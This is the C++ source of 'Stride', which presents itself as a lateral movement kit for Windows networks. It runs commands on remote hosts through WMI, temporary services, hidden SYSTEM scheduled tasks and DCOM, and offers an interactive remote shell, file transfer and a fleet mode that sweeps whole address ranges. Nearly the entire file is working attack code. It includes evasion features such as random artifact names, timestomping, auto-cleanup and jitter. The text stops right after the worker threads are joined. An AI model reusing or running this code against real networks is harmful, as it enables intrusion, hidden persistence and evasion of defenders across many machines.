// Stride - lateral movement kit for Windows networks
// C++17, WinAPI + COM only. Single static binary, no Sysinternals, no Python.
// Methods: WMI process spawn, SCM service, scheduled task, DCOM (MMC20).
// OpSec: randomized artifact names, auto-cleanup, timestomp, jitter, fleet mode.

#include <windows.h>
#include <wbemidl.h>
#include <taskschd.h>
#include <winnetwk.h>
#include <objbase.h>

#include <algorithm>
#include <atomic>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <fstream>
#include <iostream>
#include <mutex>
#include <random>
#include <string>
#include <thread>
#include <vector>

using std::string;
using std::wstring;
using std::vector;

// taskschd GUIDs are not in mingw import libs - define them here
static const CLSID XCLSID_TaskScheduler =
    {0x0F87369F, 0xA4E5, 0x4CFC, {0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD}};
static const IID XIID_ITaskService =
    {0x2FABA4C7, 0x4DA9, 0x4013, {0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85}};
static const IID XIID_IExecAction =
    {0x4C3D624D, 0xFD6B, 0x49A3, {0xB9, 0xB7, 0x09, 0xCB, 0x3C, 0xD3, 0xF3, 0xE7}};

// ---------------------------------------------------------------------------
// utils

static wstring u2w(const string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    wstring out(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), out.data(), n);
    return out;
}

static string w2u(const wstring& w) {
    if (w.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    string out(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), out.data(), n, nullptr, nullptr);
    return out;
}

static string lower(string s) {
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return (char)tolower(c); });
    return s;
}

static std::mt19937& rng_engine() {
    static std::mt19937 gen(std::random_device{}());
    return gen;
}

static unsigned rng() {
    return rng_engine()();
}

static string rand_name(int len = 10) {
    static const char* alpha = "abcdefghijklmnopqrstuvwxyz";
    string out;
    for (int i = 0; i < len; i++) out += alpha[rng() % 26];
    return out;
}

static void log_line(const char* tag, const string& msg) {
    static std::mutex mu;
    std::lock_guard<std::mutex> lock(mu);
    printf("[%s] %s\n", tag, msg.c_str());
    fflush(stdout);
}

// ---------------------------------------------------------------------------
// creds / target

struct Creds {
    wstring user;     // empty = use the current logon session (kerberos / stolen token)
    wstring pass;
    wstring domain;
    bool current() const { return user.empty(); }
    wstring upn() const { return domain.empty() ? user : domain + L"\\" + user; }
};

struct Target {
    string host;
    Creds creds;
};

// IPC$ session so admin$ and pipes are reachable under explicit creds
static bool ipc_connect(const Target& t, string& err) {
    if (t.creds.current()) return true;
    wstring remote = u2w("\\\\" + t.host + "\\IPC$");
    NETRESOURCEW nr = {};
    nr.dwType = RESOURCETYPE_ANY;
    nr.lpRemoteName = (LPWSTR)remote.c_str();
    DWORD rc = WNetAddConnection2W(&nr, t.creds.pass.c_str(), t.creds.upn().c_str(), 0);
    if (rc != ERROR_SUCCESS && rc != ERROR_ALREADY_ASSIGNED && rc != ERROR_DUPLICATE_TAG) {
        char buf[128];
        snprintf(buf, sizeof(buf), "IPC$ auth failed (winerror %lu)", rc);
        err = buf;
        return false;
    }
    return true;
}

static void ipc_drop(const Target& t) {
    if (t.creds.current()) return;
    wstring remote = u2w("\\\\" + t.host + "\\IPC$");
    WNetCancelConnection2W(remote.c_str(), 0, TRUE);
}

// ---------------------------------------------------------------------------
// remote file IO through admin$ (rel is relative to C:\Windows)

static wstring unc_admin(const Target& t, const wstring& rel) {
    return u2w("\\\\" + t.host + "\\admin$\\") + rel;
}

static bool remote_fetch(const Target& t, const wstring& rel, string& out) {
    wstring path = unc_admin(t, rel);
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD size = GetFileSize(h, nullptr);
    if (size == INVALID_FILE_SIZE) { CloseHandle(h); return false; }
    string buf(size, 0);
    DWORD read = 0;
    BOOL ok = ReadFile(h, buf.data(), size, &read, nullptr);
    CloseHandle(h);
    if (!ok) return false;
    buf.resize(read);
    out = std::move(buf);
    return true;
}

static bool remote_push_data(const Target& t, const wstring& rel, const string& data) {
    wstring path = unc_admin(t, rel);
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    BOOL ok = WriteFile(h, data.data(), (DWORD)data.size(), &written, nullptr);
    CloseHandle(h);
    return ok && written == data.size();
}

static bool remote_delete(const Target& t, const wstring& rel) {
    return DeleteFileW(unc_admin(t, rel).c_str()) != 0;
}

// steal timestamps from a system file so dropped artifacts blend in
static void remote_timestomp(const Target& t, const wstring& rel) {
    wstring ref = unc_admin(t, L"explorer.exe");
    HANDLE src = CreateFileW(ref.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                             OPEN_EXISTING, 0, nullptr);
    if (src == INVALID_HANDLE_VALUE) return;
    FILETIME ct, at, wt;
    if (!GetFileTime(src, &ct, &at, &wt)) { CloseHandle(src); return; }
    CloseHandle(src);
    HANDLE dst = CreateFileW(unc_admin(t, rel).c_str(), FILE_WRITE_ATTRIBUTES, 0, nullptr,
                             OPEN_EXISTING, 0, nullptr);
    if (dst == INVALID_HANDLE_VALUE) return;
    SetFileTime(dst, &ct, &at, &wt);
    CloseHandle(dst);
}

// wait until a remotely-spawned output file stops growing
static bool remote_wait_output(const Target& t, const wstring& rel, int timeout_ms, string& out) {
    int waited = 0;
    while (waited < timeout_ms) {
        if (remote_fetch(t, rel, out)) {
            // give the writer a beat to finish flushing
            Sleep(400);
            string again;
            if (remote_fetch(t, rel, again)) out = std::move(again);
            return true;
        }
        Sleep(500);
        waited += 500;
    }
    return false;
}

// ---------------------------------------------------------------------------
// COM bootstrap

static bool com_init() {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE && hr != S_FALSE) return false;
    hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT,
                              RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
    return SUCCEEDED(hr) || hr == RPC_E_TOO_LATE;
}

static COAUTHIDENTITY* make_auth(const Creds& creds) {
    if (creds.current()) return nullptr;
    COAUTHIDENTITY* id = (COAUTHIDENTITY*)CoTaskMemAlloc(sizeof(COAUTHIDENTITY));
    id->User = (USHORT*)CoTaskMemAlloc((creds.user.size() + 1) * 2);
    wcscpy_s((wchar_t*)id->User, creds.user.size() + 1, creds.user.c_str());
    id->UserLength = (ULONG)creds.user.size();
    id->Password = (USHORT*)CoTaskMemAlloc((creds.pass.size() + 1) * 2);
    wcscpy_s((wchar_t*)id->Password, creds.pass.size() + 1, creds.pass.c_str());
    id->PasswordLength = (ULONG)creds.pass.size();
    id->Domain = (USHORT*)CoTaskMemAlloc((creds.domain.size() + 1) * 2);
    wcscpy_s((wchar_t*)id->Domain, creds.domain.size() + 1, creds.domain.c_str());
    id->DomainLength = (ULONG)creds.domain.size();
    id->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    return id;
}

// ---------------------------------------------------------------------------
// method: WMI - Win32_Process.Create, no service, no task, minimal footprint

static bool exec_wmi(const Target& t, const wstring& command, string& err) {
    IWbemLocator* loc = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                  IID_IWbemLocator, (LPVOID*)&loc);
    if (FAILED(hr)) { err = "CoCreateInstance WbemLocator failed"; return false; }

    COAUTHIDENTITY* auth = make_auth(t.creds);
    wstring ns = u2w("\\\\" + t.host + "\\root\\cimv2");
    IWbemServices* svc = nullptr;
    hr = loc->ConnectServer((BSTR)ns.c_str(),
                            auth ? (BSTR)t.creds.user.c_str() : nullptr,
                            auth ? (BSTR)t.creds.pass.c_str() : nullptr,
                            nullptr, 0, nullptr, nullptr, &svc);
    loc->Release();
    if (FAILED(hr)) {
        char buf[96];
        snprintf(buf, sizeof(buf), "wmi connect failed (0x%lx)", hr);
        err = buf;
        return false;
    }

    if (auth) {
        COAUTHINFO coauth = {};
        coauth.dwAuthnSvc = RPC_C_AUTHN_WINNT;
        coauth.dwAuthzSvc = RPC_C_AUTHZ_NONE;
        coauth.dwAuthnLevel = RPC_C_AUTHN_LEVEL_CALL;
        coauth.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        coauth.pAuthIdentityData = auth;
        coauth.dwCapabilities = EOAC_NONE;
        CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                          RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                          auth, EOAC_NONE);
    }

    IWbemClassObject* cls = nullptr;
    hr = svc->GetObjectA((BSTR)L"Win32_Process", 0, nullptr, &cls, nullptr);
    if (FAILED(hr)) { svc->Release(); err = "Win32_Process lookup failed"; return false; }
    IWbemClassObject* in_sig = nullptr;
    cls->GetMethod(L"Create", 0, &in_sig, nullptr);
    IWbemClassObject* in_inst = nullptr;
    in_sig->SpawnInstance(0, &in_inst);
    VARIANT v;
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(command.c_str());
    in_inst->Put(L"CommandLine", 0, &v, 0);
    VariantClear(&v);

    IWbemClassObject* out_params = nullptr;
    hr = svc->ExecMethod((BSTR)L"Win32_Process", (BSTR)L"Create", 0, nullptr,
                         in_inst, &out_params, nullptr);
    in_inst->Release();
    in_sig->Release();
    cls->Release();
    svc->Release();

    if (FAILED(hr)) {
        char buf[96];
        snprintf(buf, sizeof(buf), "wmi exec failed (0x%lx)", hr);
        err = buf;
        return false;
    }
    // check ReturnValue
    VARIANT rv;
    VariantInit(&rv);
    if (out_params && SUCCEEDED(out_params->Get(L"ReturnValue", 0, &rv, nullptr, nullptr))) {
        if (rv.uintVal != 0) {
            char buf[96];
            snprintf(buf, sizeof(buf), "Win32_Process.Create returned %lu", rv.uintVal);
            err = buf;
            out_params->Release();
            VariantClear(&rv);
            return false;
        }
    }
    if (out_params) out_params->Release();
    VariantClear(&rv);
    return true;
}

// ---------------------------------------------------------------------------
// method: SCM - random-named service, auto-removed afterwards

static bool exec_scm(const Target& t, const wstring& command, string& err) {
    string aerr;
    if (!ipc_connect(t, aerr)) { err = aerr; return false; }

    wstring scm_host = u2w("\\\\" + t.host);
    SC_HANDLE scm = OpenSCManagerW(scm_host.c_str(), nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) { err = "OpenSCManager failed - admin share/auth required"; return false; }

    wstring name = u2w(rand_name(8));
    wstring bin = L"cmd.exe /c " + command;
    SC_HANDLE svc = CreateServiceW(scm, name.c_str(), name.c_str(), SERVICE_ALL_ACCESS,
                                   SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                                   SERVICE_ERROR_IGNORE, bin.c_str(),
                                   nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!svc) {
        CloseServiceHandle(scm);
        char buf[96];
        snprintf(buf, sizeof(buf), "CreateService failed (winerror %lu)", GetLastError());
        err = buf;
        return false;
    }

    // a cmd shim exits on its own - ERROR_SERVICE_REQUEST_TIMEOUT-ish exits are fine
    StartServiceW(svc, 0, nullptr);
    for (int i = 0; i < 24; i++) {
        SERVICE_STATUS st = {};
        if (QueryServiceStatus(svc, &st) && st.dwCurrentState == SERVICE_STOPPED) break;
        Sleep(250);
    }
    DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return true;
}

// ---------------------------------------------------------------------------
// method: scheduled task via ITaskService - runs as SYSTEM, hidden, removed after

static VARIANT bstr_variant(const wstring& s) {
    VARIANT v;
    VariantInit(&v);
    if (!s.empty()) { v.vt = VT_BSTR; v.bstrVal = SysAllocString(s.c_str()); }
    return v;
}

static bool exec_task(const Target& t, const wstring& command, string& err) {
    ITaskService* ts = nullptr;
    HRESULT hr = CoCreateInstance(XCLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
                                  XIID_ITaskService, (void**)&ts);
    if (FAILED(hr)) { err = "TaskScheduler COM init failed"; return false; }

    VARIANT vhost = bstr_variant(u2w(t.host));
    VARIANT vuser = bstr_variant(t.creds.user);
    VARIANT vdom = bstr_variant(t.creds.domain);
    VARIANT vpass = bstr_variant(t.creds.pass);
    hr = ts->Connect(vhost, vuser, vdom, vpass);
    VariantClear(&vhost); VariantClear(&vuser); VariantClear(&vdom); VariantClear(&vpass);
    if (FAILED(hr)) {
        ts->Release();
        char buf[96];
        snprintf(buf, sizeof(buf), "task service connect failed (0x%lx)", hr);
        err = buf;
        return false;
    }

    ITaskFolder* folder = nullptr;
    ts->GetFolder(SysAllocString(L"\\"), &folder);
    ITaskDefinition* def = nullptr;
    ts->NewTask(0, &def);

    ITaskSettings* settings = nullptr;
    if (SUCCEEDED(def->get_Settings(&settings)) && settings) {
        settings->put_Hidden(VARIANT_TRUE);
        settings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        settings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        settings->Release();
    }

    IPrincipal* principal = nullptr;
    if (SUCCEEDED(def->get_Principal(&principal)) && principal) {
        principal->put_UserId(SysAllocString(L"SYSTEM"));
        principal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
        principal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        principal->Release();
    }

    IActionCollection* actions = nullptr;
    def->get_Actions(&actions);
    IAction* action = nullptr;
    actions->Create(TASK_ACTION_EXEC, &action);
    IExecAction* exec = nullptr;
    action->QueryInterface(XIID_IExecAction, (void**)&exec);
    exec->put_Path(SysAllocString(L"cmd.exe"));
    wstring args = L"/c " + command;
    exec->put_Arguments(SysAllocString(args.c_str()));
    exec->Release();
    action->Release();
    actions->Release();

    wstring tname = u2w(rand_name(9));
    IRegisteredTask* reg = nullptr;
    VARIANT empty_user, empty_pass, empty_sddl;
    VariantInit(&empty_user); VariantInit(&empty_pass); VariantInit(&empty_sddl);
    hr = folder->RegisterTaskDefinition(SysAllocString(tname.c_str()), def,
                                        TASK_CREATE_OR_UPDATE, empty_user, empty_pass,
                                        TASK_LOGON_NONE, empty_sddl, &reg);
    def->Release();
    if (FAILED(hr)) {
        folder->Release();
        ts->Release();
        char buf[96];
        snprintf(buf, sizeof(buf), "task registration failed (0x%lx)", hr);
        err = buf;
        return false;
    }

    VARIANT no_params;
    VariantInit(&no_params);
    IRunningTask* running = nullptr;
    reg->Run(no_params, &running);

    for (int i = 0; i < 24; i++) {
        TASK_STATE state;
        if (reg && SUCCEEDED(reg->get_State(&state)) &&
            (state == TASK_STATE_READY || state == TASK_STATE_DISABLED)) break;
        Sleep(250);
    }
    if (running) running->Release();
    if (reg) reg->Release();

    VARIANT force;
    VariantInit(&force);
    folder->DeleteTask(SysAllocString(tname.c_str()), 0);
    folder->Release();
    ts->Release();
    return true;
}

// ---------------------------------------------------------------------------
// method: DCOM via MMC20.Application - no service, no task, rare telemetry

static const CLSID CLSID_MMC20_APP =
    {0x49B2791A, 0xB1AE, 0x4C90, {0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89}};

static HRESULT disp_get(IDispatch* disp, const wchar_t* name, IDispatch** out) {
    DISPID id;
    HRESULT hr = disp->GetIDsOfNames(IID_NULL, (LPOLESTR*)&name, 1, LOCALE_USER_DEFAULT, &id);
    if (FAILED(hr)) return hr;
    DISPPARAMS params = {};
    VARIANT result;
    VariantInit(&result);
    hr = disp->Invoke(id, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
                      &params, &result, nullptr, nullptr);
    if (FAILED(hr) || result.vt != VT_DISPATCH) return FAILED(hr) ? hr : E_FAIL;
    *out = result.pdispVal;
    return S_OK;
}

static HRESULT disp_call(IDispatch* disp, const wchar_t* name, vector<VARIANT>& args) {
    DISPID id;
    HRESULT hr = disp->GetIDsOfNames(IID_NULL, (LPOLESTR*)&name, 1, LOCALE_USER_DEFAULT, &id);
    if (FAILED(hr)) return hr;
    // IDispatch wants arguments in reverse order
    vector<VARIANT> reversed(args.rbegin(), args.rend());
    DISPPARAMS params = { reversed.data(), nullptr, (UINT)reversed.size(), 0 };
    return disp->Invoke(id, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD,
                        &params, nullptr, nullptr, nullptr);
}

static bool exec_dcom(const Target& t, const wstring& command, string& err) {
    wstring host_w = u2w(t.host);
    COAUTHIDENTITY* auth = make_auth(t.creds);
    COAUTHINFO coauth = {};
    coauth.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    coauth.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    coauth.dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
    coauth.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    coauth.pAuthIdentityData = auth;
    coauth.dwCapabilities = EOAC_NONE;

    COSERVERINFO server = {};
    server.pwszName = (LPWSTR)host_w.c_str();
    server.pAuthInfo = auth ? &coauth : nullptr;

    MULTI_QI qi = {};
    qi.pIID = &IID_IDispatch;
    HRESULT hr = CoCreateInstanceEx(CLSID_MMC20_APP, nullptr, CLSCTX_REMOTE_SERVER,
                                    &server, 1, &qi);
    if (FAILED(hr) || FAILED(qi.hr) || !qi.pItf) {
        char buf[96];
        snprintf(buf, sizeof(buf), "dcom activation failed (0x%lx)", FAILED(hr) ? hr : qi.hr);
        err = buf;
        return false;
    }

    IDispatch* app = (IDispatch*)qi.pItf;
    IDispatch* doc = nullptr;
    IDispatch* view = nullptr;
    hr = disp_get(app, L"Document", &doc);
    if (SUCCEEDED(hr)) hr = disp_get(doc, L"ActiveView", &view);
    if (FAILED(hr)) {
        app->Release();
        err = "dcom document/view lookup failed";
        return false;
    }

    vector<VARIANT> args;
    args.push_back(bstr_variant(L"cmd.exe"));                    // command
    args.push_back(bstr_variant(L"C:\\Windows"));                // working dir
    args.push_back(bstr_variant(L"/c " + command));              // params
    args.push_back(bstr_variant(L"7"));                          // window state: minimized
    hr = disp_call(view, L"ExecuteShellCommand", args);
    for (auto& a : args) VariantClear(&a);
    view->Release();
    doc->Release();
    app->Release();
    if (FAILED(hr)) {
        char buf[96];
        snprintf(buf, sizeof(buf), "ExecuteShellCommand failed (0x%lx)", hr);
        err = buf;
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// exec orchestration: run a command with output capture, try methods in order

struct ExecResult {
    bool ok = false;
    string method;
    string output;
    string error;
};

static const char* METHODS[] = {"wmi", "scm", "task", "dcom"};

static bool exec_raw(const Target& t, const string& method, const wstring& cmd, string& err) {
    if (method == "wmi") return exec_wmi(t, cmd, err);
    if (method == "scm") return exec_scm(t, cmd, err);
    if (method == "task") return exec_task(t, cmd, err);
    if (method == "dcom") return exec_dcom(t, cmd, err);
    err = "unknown method";
    return false;
}

static ExecResult exec_on(const Target& t, const string& cmd, const string& method_pref,
                          bool capture_output) {
    ExecResult res;

    string fname = rand_name(8) + ".tmp";
    wstring wrapped = u2w(cmd);
    if (capture_output)
        wrapped = u2w(cmd + " > C:\\Windows\\Temp\\" + fname + " 2>&1");

    vector<string> order;
    if (method_pref != "auto") order.push_back(method_pref);
    else for (const char* m : METHODS) order.push_back(m);

    string last_err;
    for (const string& m : order) {
        string err;
        if (!exec_raw(t, m, wrapped, err)) { last_err = m + ": " + err; continue; }

        res.ok = true;
        res.method = m;
        if (capture_output) {
            string aerr;
            if (ipc_connect(t, aerr)) {
                string out;
                if (remote_wait_output(t, u2w("Temp\\" + fname), 15000, out))
                    res.output = out;
                remote_delete(t, u2w("Temp\\" + fname));
                ipc_drop(t);
            } else {
                res.error = "output fetch failed: " + aerr;
            }
        }
        return res;
    }
    res.error = last_err;
    return res;
}

// ---------------------------------------------------------------------------
// interactive shell through WMI - fastest method, least artifacts

static void interactive_shell(const Target& t) {
    printf("[*] interactive shell on %s via wmi (type 'exit' to quit)\n", t.host.c_str());
    string line;
    while (true) {
        printf("stride:%s> ", t.host.c_str());
        fflush(stdout);
        if (!std::getline(std::cin, line)) break;
        if (line == "exit" || line == "quit") break;
        if (line.empty()) continue;
        ExecResult res = exec_on(t, line, "wmi", true);
        if (!res.ok) {
            printf("[!] exec failed: %s\n", res.error.c_str());
            continue;
        }
        if (!res.output.empty()) printf("%s", res.output.c_str());
        if (!res.error.empty()) printf("[!] %s\n", res.error.c_str());
    }
}

// ---------------------------------------------------------------------------
// upload / download through C$ - drive letters map to admin shares

static wstring unc_for(const Target& t, const string& abs_path) {
    // C:\foo\bar -> \\host\C$\foo\bar
    string p = abs_path;
    if (p.size() > 2 && p[1] == ':') {
        string share;
        share += (char)toupper(p[0]);
        share += '$';
        p = share + p.substr(2);
    }
    return u2w("\\\\" + t.host + "\\" + p);
}

static bool upload_file(const Target& t, const string& local, const string& remote, string& err) {
    string aerr;
    if (!ipc_connect(t, aerr)) { err = aerr; return false; }

    std::ifstream in(local, std::ios::binary);
    if (!in) { err = "cannot read local file"; return false; }
    string data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());

    HANDLE h = CreateFileW(unc_for(t, remote).c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        err = "cannot open remote path - check admin share and permissions";
        return false;
    }
    DWORD written = 0;
    WriteFile(h, data.data(), (DWORD)data.size(), &written, nullptr);
    CloseHandle(h);

    // blend in with system files
    wstring ref = unc_for(t, "C:\\Windows\\explorer.exe");
    HANDLE src = CreateFileW(ref.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (src != INVALID_HANDLE_VALUE) {
        FILETIME ct, at, wt;
        if (GetFileTime(src, &ct, &at, &wt)) {
            HANDLE dst = CreateFileW(unc_for(t, remote).c_str(), FILE_WRITE_ATTRIBUTES, 0,
                                     nullptr, OPEN_EXISTING, 0, nullptr);
            if (dst != INVALID_HANDLE_VALUE) { SetFileTime(dst, &ct, &at, &wt); CloseHandle(dst); }
        }
        CloseHandle(src);
    }
    ipc_drop(t);
    return written == data.size();
}

static bool download_file(const Target& t, const string& remote, const string& local, string& err) {
    string aerr;
    if (!ipc_connect(t, aerr)) { err = aerr; return false; }
    HANDLE h = CreateFileW(unc_for(t, remote).c_str(), GENERIC_READ, FILE_SHARE_READ,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) { err = "remote file not readable"; return false; }
    DWORD size = GetFileSize(h, nullptr);
    vector<char> buf(size);
    DWORD read = 0;
    ReadFile(h, buf.data(), size, &read, nullptr);
    CloseHandle(h);
    std::ofstream out(local, std::ios::binary);
    out.write(buf.data(), read);
    ipc_drop(t);
    return true;
}

// ---------------------------------------------------------------------------
// fleet mode

static vector<string> expand_cidr(const string& cidr) {
    vector<string> out;
    size_t slash = cidr.find('/');
    if (slash == string::npos) { out.push_back(cidr); return out; }
    string base = cidr.substr(0, slash);
    int bits = atoi(cidr.substr(slash + 1).c_str());
    unsigned ip = 0;
    unsigned a, b, c, d;
    if (sscanf(base.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return out;
    ip = (a << 24) | (b << 16) | (c << 8) | d;
    if (bits < 8 || bits > 32) return out;
    unsigned mask = bits == 32 ? 0xFFFFFFFF : (0xFFFFFFFF << (32 - bits));
    unsigned first = ip & mask;
    unsigned last = first | ~mask;
    if (bits < 31) { first++; last--; }  // skip network/broadcast
    for (unsigned cur = first; cur <= last; cur++) {
        char buf[24];
        snprintf(buf, sizeof(buf), "%u.%u.%u.%u", (cur >> 24) & 255, (cur >> 16) & 255,
                 (cur >> 8) & 255, cur & 255);
        out.push_back(buf);
    }
    return out;
}

struct FleetJob {
    vector<string> hosts;
    Creds creds;
    string cmd;
    string method;
    int jitter_ms;
    std::atomic<size_t> next{0};
    std::atomic<int> hits{0};
};

static void fleet_worker(FleetJob& job) {
    while (true) {
        size_t i = job.next.fetch_add(1);
        if (i >= job.hosts.size()) break;
        Target t{job.hosts[i], job.creds};
        ExecResult res = exec_on(t, job.cmd, job.method, true);
        if (res.ok) {
            job.hits++;
            printf("[+] %s (%s)\n", t.host.c_str(), res.method.c_str());
            if (!res.output.empty()) {
                string out = res.output;
                std::replace(out.begin(), out.end(), '\n', ' ');
                printf("    %.300s%s\n", out.c_str(), out.size() > 300 ? "..." : "");
            }
        } else {
            printf("[-] %s - %s\n", t.host.c_str(), res.error.c_str());
        }
        if (job.jitter_ms > 0) {
            std::uniform_int_distribution<int> dist(0, job.jitter_ms);
            Sleep(dist(rng_engine()));
        }
    }
}

// ---------------------------------------------------------------------------
// CLI

static const char* BANNER = R"(
███████╗████████╗██████╗ ██╗██████╗ ███████╗
██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██╔════╝
███████╗   ██║   ██████╔╝██║██║  ██║█████╗
╚════██║   ██║   ██╔══██╗██║██║  ██║██╔══╝
███████║   ██║   ██║  ██║██║██████╔╝███████╗
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝)";

static const char* VERSION = "1.0.0";

static void usage() {
    printf("stride %s - lateral movement kit\n\n", VERSION);
    printf("single target:\n");
    printf("  stride --target HOST [--user U --pass P [--domain D]] --cmd \"whoami /all\"\n");
    printf("  stride --target HOST --shell                  interactive wmi shell\n");
    printf("  stride --target HOST --method scm --cmd \"...\"\n");
    printf("\nfleet:\n");
    printf("  stride --targets hosts.txt --cmd \"net user\" [--threads 8] [--jitter 500]\n");
    printf("  stride --cidr 10.10.20.0/24 --user admin --pass 'P@ss' --cmd \"hostname\"\n");
    printf("\nfiles:\n");
    printf("  stride --target HOST --upload local.exe \"C:\\Windows\\Temp\\x.exe\"\n");
    printf("  stride --target HOST --download \"C:\\loot\\dump.txt\" out.txt\n");
    printf("\nmethods: wmi, scm, task, dcom, auto (default: auto)\n");
    printf("no --user = current logon session (kerberos, stolen tokens, runas /netonly)\n");
}

int main(int argc, char** argv) {
    SetConsoleOutputCP(CP_UTF8);

    string host, targets_file, cidr, cmd, method = "auto";
    string user, pass, domain;
    string upload_src, upload_dst, download_src, download_dst;
    bool shell = false;
    int threads = 4, jitter = 0;

    for (int i = 1; i < argc; i++) {
        string a = argv[i];
        auto next = [&](string& out) -> bool {
            if (i + 1 < argc) { out = argv[++i]; return true; }
            return false;
        };
        if (a == "--target") next(host);
        else if (a == "--targets") next(targets_file);
        else if (a == "--cidr") next(cidr);
        else if (a == "--cmd") next(cmd);
        else if (a == "--method") next(method);
        else if (a == "--user") next(user);
        else if (a == "--pass") next(pass);
        else if (a == "--domain") next(domain);
        else if (a == "--shell") shell = true;
        else if (a == "--threads") { string v; if (next(v)) threads = atoi(v.c_str()); }
        else if (a == "--jitter") { string v; if (next(v)) jitter = atoi(v.c_str()); }
        else if (a == "--upload") {
            if (!next(upload_src) || !next(upload_dst)) { usage(); return 2; }
        }
        else if (a == "--download") {
            if (!next(download_src) || !next(download_dst)) { usage(); return 2; }
        }
        else if (a == "--version") { printf("stride %s\n", VERSION); return 0; }
        else if (a == "--help") { usage(); return 0; }
        else { usage(); return 2; }
    }

    printf("%s\n", BANNER);
    printf("  lateral movement kit v%s - authorized operations only\n\n", VERSION);

    if (!com_init()) {
        fprintf(stderr, "[-] COM initialization failed\n");
        return 1;
    }

    Creds creds{u2w(user), u2w(pass), u2w(domain)};

    if (!host.empty()) {
        Target t{host, creds};
        if (!upload_src.empty()) {
            string err;
            if (upload_file(t, upload_src, upload_dst, err))
                log_line("+", "uploaded " + upload_src + " -> " + t.host + ":" + upload_dst + " (timestomped)");
            else { log_line("-", "upload failed: " + err); return 1; }
            return 0;
        }
        if (!download_src.empty()) {
            string err;
            if (download_file(t, download_src, download_dst, err))
                log_line("+", "downloaded " + t.host + ":" + download_src + " -> " + download_dst);
            else { log_line("-", "download failed: " + err); return 1; }
            return 0;
        }
        if (shell) { interactive_shell(t); return 0; }
        if (cmd.empty()) { usage(); return 2; }
        ExecResult res = exec_on(t, cmd, method, true);
        if (!res.ok) { printf("[-] %s - %s\n", host.c_str(), res.error.c_str()); return 1; }
        printf("[+] %s executed via %s\n", host.c_str(), res.method.c_str());
        if (!res.output.empty()) printf("%s", res.output.c_str());
        return 0;
    }

    vector<string> hosts;
    if (!targets_file.empty()) {
        std::ifstream in(targets_file);
        string line;
        while (std::getline(in, line)) {
            line.erase(0, line.find_first_not_of(" \t\r"));
            line.erase(line.find_last_not_of(" \t\r") + 1);
            if (!line.empty() && line[0] != '#') hosts.push_back(line);
        }
    }
    if (!cidr.empty()) {
        auto expanded = expand_cidr(cidr);
        hosts.insert(hosts.end(), expanded.begin(), expanded.end());
    }

    if (hosts.empty()) { usage(); return 2; }
    if (cmd.empty()) { usage(); return 2; }

    printf("[*] fleet: %zu hosts, %d threads, method=%s\n", hosts.size(), threads, method.c_str());
    FleetJob job{hosts, creds, cmd, method, jitter};
    vector<std::thread> pool;
    for (int i = 0; i < threads; i++) pool.emplace_back(fleet_worker, std::ref(job));
    for (auto& th : pool) th.join();
